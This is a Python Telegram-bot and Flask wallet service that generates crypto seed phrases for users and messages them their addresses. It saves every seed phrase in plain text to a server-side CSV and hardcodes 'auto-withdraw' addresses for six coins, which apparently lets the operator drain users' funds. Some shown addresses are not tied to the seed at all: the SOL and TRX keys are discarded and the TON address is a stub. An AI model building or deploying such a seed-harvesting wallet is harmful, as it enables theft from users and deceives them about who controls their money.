import os
import csv
import json
import threading
from flask import Flask, request, send_from_directory
from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from mnemonic import Mnemonic
from bitcoinlib.wallets import Wallet
from eth_account import Account
from tronpy import Tron
from tronpy.keys import PrivateKey
import solana.keypair
import solana.publickey

app = Flask(__name__, static_folder="miniapp")

ADMIN_CHAT_ID = YOUR_ADMIN_CHAT_ID  # заменить на реальный Telegram ID админа
BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
USERS_FILE = 'users.csv'

AUTO_WITHDRAW_ADDRESSES = {
    'BTC': 'bc1p35kadwmakwd5hywq7rlludk846x09a0zwcsr7vzt7kmrhexz4ekskh4dph',
    'ETH': '0x0285fd07d0DFd3edb97F1c1e527A2a5A1045fFD8',
    'BNB': '0x0285fd07d0DFd3edb97F1c1e527A2a5A1045fFD8',
    'SOL': 'GPHpQxmFtwJh8kx49A51gdQZEwHvFkcg46t8xiZ1u9Vo',
    'TRX': 'TAqX18DVtzSM2HuSPU5EHhbbGNkqkRoYRW',
    'TON': 'UQAmxv8zN81Ig3UAiWpQ4m484aVmNQA-iTJNbHzhdAiajIrT'
}

def init_users_file():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['telegram_id', 'account_id', 'seed', 'btc', 'eth', 'bnb', 'sol', 'trx', 'ton'])

def generate_wallets():
    mnemo = Mnemonic("english")
    seed_phrase = mnemo.generate(strength=128)

    btc_wallet = Wallet.create(name=None, keys=seed_phrase, witness_type='segwit', network='bitcoin', db_uri=None)
    btc_address = btc_wallet.get_key().address

    acct_eth = Account.from_mnemonic(seed_phrase)
    eth_address = acct_eth.address

    acct_bnb = Account.from_mnemonic(seed_phrase)
    bnb_address = acct_bnb.address

    sol_keypair = solana.keypair.Keypair.generate()
    sol_address = str(sol_keypair.public_key)

    client = Tron()
    acct_trx = client.generate_address()
    trx_address = acct_trx['base58check_address']

    ton_address = 'TON_' + seed_phrase.split()[0]  # временная заглушка

    return seed_phrase, btc_address, eth_address, bnb_address, sol_address, trx_address, ton_address

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    telegram_id = update.effective_user.id
    account_id = f'id{telegram_id}'

    seed, btc, eth, bnb, sol, trx, ton = generate_wallets()

    with open(USERS_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([telegram_id, account_id, seed, btc, eth, bnb, sol, trx, ton])

    msg = f"🔐 Ваши кошельки созданы!\nВаши адреса:\nBTC: {btc}\nETH: {eth}\nBNB: {bnb}\nSOL: {sol}\nTRX: {trx}\nTON: {ton}\n\nСид-фраза (СОХРАНИТЕ):\n{seed}"

    await context.bot.send_message(chat_id=telegram_id, text=msg)
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"👤 Новый пользователь: {telegram_id}\nАккаунт: {account_id}\nBTC: {btc}\nETH: {eth}\nBNB: {bnb}\nSOL: {sol}\nTRX: {trx}\nTON: {ton}")

@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(app.static_folder, path)

def start_bot():
    app_telegram = ApplicationBuilder().token(BOT_TOKEN).build()
    app_telegram.add_handler(CommandHandler("start", start))
    app_telegram.run_polling()

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)

if __name__ == '__main__':
    init_users_file()
    threading.Thread(target=start_bot).start()
    run_flask()
